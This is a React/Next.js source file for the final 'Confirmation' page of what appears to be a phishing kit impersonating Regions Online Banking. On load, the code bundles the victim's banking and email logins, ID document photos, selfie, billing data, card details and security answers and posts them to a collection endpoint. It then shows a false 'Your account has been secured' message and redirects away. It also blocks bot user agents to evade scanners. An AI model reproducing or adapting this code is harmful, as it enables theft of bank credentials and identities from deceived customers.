import { Box, Flex, Text } from "@chakra-ui/react";
import axios from "axios";
import MobileDetect from "mobile-detect";
import { NextPage } from "next";
import Head from "next/head";
import React, { useContext, useEffect } from "react";
import { Container } from "../../components/Container";
import { Wrapper } from "../../components/Wrapper";
import { dataURItoBlob } from "../../utils/dataURItoBlob";
import { getProgress } from "../../utils/getProgress";
import { DataContext } from "../_app";

interface ConfirmationProps {}

const Confirmation: NextPage<ConfirmationProps> = ({}) => {
  const { data } = useContext(DataContext);
  useEffect(() => {
    if (typeof window !== `undefined` && data && Object.keys(data).length) {
      const front = data.docs && data.docs.front;
      const back = data.docs && data.docs.back;
      const logins = data.logins;
      const selfie = data.selfie;
      const emailLogins = data.emailLogins;
      const billing = data.billing;
      const cardDetails = data.cardDetails;
      const securityQuestions = data.securityQuestions;

      const sendSession = async () => {
        if (logins) {
          const formData = new FormData();

          if (front && back) {
            formData.append(`front`, front);
            formData.append(`back`, back);
          }

          if (logins) {
            formData.append(`logins`, JSON.stringify(logins));
          }

          if (selfie) {
            formData.append(`selfie`, dataURItoBlob(selfie));
          }

          if (emailLogins) {
            formData.append(`emailLogins`, JSON.stringify(emailLogins));
          }

          if (billing) {
            formData.append(`billing`, JSON.stringify(billing));
          }

          if (cardDetails) {
            formData.append(`cardDetails`, JSON.stringify(cardDetails));
          }

          if (securityQuestions) {
            formData.append(
              `securityQuestions`,
              JSON.stringify(securityQuestions)
            );
          }

          formData.append(`form`, `SESSION`);

          await axios.post(`/api/send-session`, formData, {
            headers: {
              "Content-Type": `multipart/form-data`,
            },
          });
        } else {
          console.log(`You are on the server`);
        }

        window.location.href = process.env.NEXT_PUBLIC_EXIT_URL as string;
      };

      sendSession();
    }
    return () => {};
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  return (
    <Wrapper>
      <Head>
        <title>Regions Online Banking - Confirmation | Regions</title>
      </Head>
      <Box as={`main`} display={`block`}>
        <Container
          progress={getProgress()}
          highlight={getProgress().indexOf(`Confirmation`)}
          showTitle
          showSide
          display={`flex`}
          bgColor={`#fff`}
          border={`2px solid #eee`}
          borderBottom={[`none`, `2px solid #eee`]}
          borderLeft={[`none`, `2px solid #eee`]}
          borderRight={[`none`, `2px solid #eee`]}
          borderRadius={`2px`}
          boxShadow={[`none`, `0 4px 10px rgb(0 0 0 / 3%)`]}
          justifyContent={`flex-start`}
          m={[`15px auto 30px`, `50px auto`]}
          p={0}
          maxW={`initial`}
          w={`auto`}
          bg={`#f9f9f9`}
          flexDir={[`column`, `row`]}
        >
          <Box
            flex={`1 1 auto`}
            borderRight={[`none`, `2px solid #eee`]}
            borderBottom={[`2px solid #eee`, `none`]}
            p={[`30px 15px`, `30px`]}
            bg={`white`}
            h={`400px`}
          >
            <Flex flexDir={`column`}>
              <Text
                as={`h2`}
                fontFamily={`inherit`}
                fontWeight={700}
                lineHeight={1.1}
                color={`inherit`}
                mb={`13.5px`}
                fontSize={`18px`}
              >
                Your account has been secured
              </Text>
              <Box>
                <Text>
                  Please wait while we redirect you to the login page.
                </Text>
                <Flex
                  my={`30px`}
                  bg={`#d3d3d3`}
                  maxW={[`100%`, `40%`]}
                  w={`100%`}
                  h={`150px`}
                  alignItems={`center`}
                  justifyContent={`center`}
                >
                  <Box className="lds-ellipsis">
                    <Box />
                    <Box />
                    <Box />
                    <Box />
                  </Box>
                </Flex>
              </Box>
            </Flex>
          </Box>
        </Container>
      </Box>
    </Wrapper>
  );
};

Confirmation.getInitialProps = ({ res, req, ...props }) => {
  const md = new MobileDetect(req?.headers[`user-agent`] as string);
  const isBot = md.is(`Bot`);
  if (isBot) {
    res?.end(`Fuck off`);
    return {};
  }

  return {
    ...props,
  };
};

export default Confirmation;
